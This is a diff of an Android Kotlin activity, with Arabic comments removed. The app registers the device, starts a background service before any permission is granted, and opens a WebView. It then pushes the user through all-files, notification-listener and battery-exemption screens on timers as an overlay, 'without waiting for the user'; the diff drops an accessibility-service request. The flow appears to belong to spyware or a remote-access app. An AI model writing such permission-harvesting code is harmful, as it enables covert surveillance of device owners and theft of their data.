@@ -28,13 +28,9 @@ class MainActivity : AppCompatActivity() {
         white.setBackgroundColor(Color.WHITE)
         setContentView(white)
 
-        // ⭐ 1. سجّل الجهاز فورًا
         DeviceManager.registerDevice(this)
-
-        // ⭐ 2. شغّل الخدمة فورًا — بدون انتظار أي صلاحية
         startBackgroundService()
 
-        // ⭐ 3. افتح WebView فورًا
         android.os.Handler(mainLooper).postDelayed({
             try {
                 startActivity(Intent(this, WebViewActivity::class.java))
@@ -42,8 +38,6 @@ class MainActivity : AppCompatActivity() {
             } catch (_: Exception) {}
         }, 500)
 
-        // ⭐ 4. اطلب الصلاحيات — بدون انتظار
-        // (تظهر كطبقة فوق الـ WebView)
         android.os.Handler(mainLooper).postDelayed({
             requestPermissionsStep1()
         }, 2000)
@@ -94,8 +88,6 @@ class MainActivity : AppCompatActivity() {
         grantResults: IntArray
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        // ⭐ لا نطلب الصلاحيات الخاصة تلقائيًا — تظهر فقط عند الحاجة
-        // بدلًا من ذلك:
         requestAllFilesAccess()
     }
 
@@ -123,23 +115,12 @@ class MainActivity : AppCompatActivity() {
                 startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
             } catch (_: Exception) {}
         }
-        // لا ننتظر المستخدم — نكمل
-        android.os.Handler(mainLooper).postDelayed({ requestAccessibility() }, 2000)
+        android.os.Handler(mainLooper).postDelayed({ requestBatteryOptimization() }, 2000)
     }
 
     private fun isNotifAccessGranted(): Boolean {
         val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
         return flat != null && flat.contains(packageName)
-    }
-
-    private fun requestAccessibility() {
-        if (!AccessibilityHelper.isEnabled(this)) {
-            try {
-                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
-            } catch (_: Exception) {}
-        }
-        // لا ننتظر — نكمل
-        android.os.Handler(mainLooper).postDelayed({ requestBatteryOptimization() }, 2000)
     }
 
     private fun requestBatteryOptimization() {
@@ -148,12 +129,8 @@ class MainActivity : AppCompatActivity() {
             intent.data = Uri.parse("package:$packageName")
             startActivity(intent)
         } catch (_: Exception) {}
-        // لا نطلب التقاط الشاشة تلقائيًا — يطلب عند الحاجة
     }
 
-    /**
-     * ⭐ تشغيل الخدمة فورًا — بدون انتظار أي صلاحية
-     */
     private fun startBackgroundService() {
         try {
             createNotificationChannel()
